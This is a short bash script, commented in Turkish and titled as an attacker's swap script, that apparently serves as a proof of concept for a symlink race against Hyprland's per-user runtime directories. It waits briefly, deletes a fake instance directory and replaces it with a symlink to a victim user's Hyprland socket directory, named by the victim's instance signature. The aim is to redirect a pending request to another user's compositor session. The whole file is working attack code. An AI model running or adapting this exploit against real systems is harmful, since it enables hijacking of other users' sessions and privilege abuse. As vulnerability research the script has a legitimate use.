#!/bin/bash
# watcher.sh - attacker'ın swap scripti
FAKE_DIR="/run/user/1002/hypr/fakeinst"
VICTIM_SIG="$1"   # komut satırından B'nin signature'ını alacağız
VICTIM_DIR="/run/user/1000/hypr/${VICTIM_SIG}"

echo "Watching for pause request..."
echo "Will swap to: $VICTIM_DIR"

# Basit versiyon: sürekli kontrol et, server bir istek aldığında hemen swap yap
# (gerçek watcher burada log dosyasını izleyebilir, ama basit tutalım: sabit bekleme + swap)

sleep 1
rm -rf "$FAKE_DIR"
ln -s "$VICTIM_DIR" "$FAKE_DIR"
echo "Swapped $FAKE_DIR -> $VICTIM_DIR"
ls -la "$FAKE_DIR"
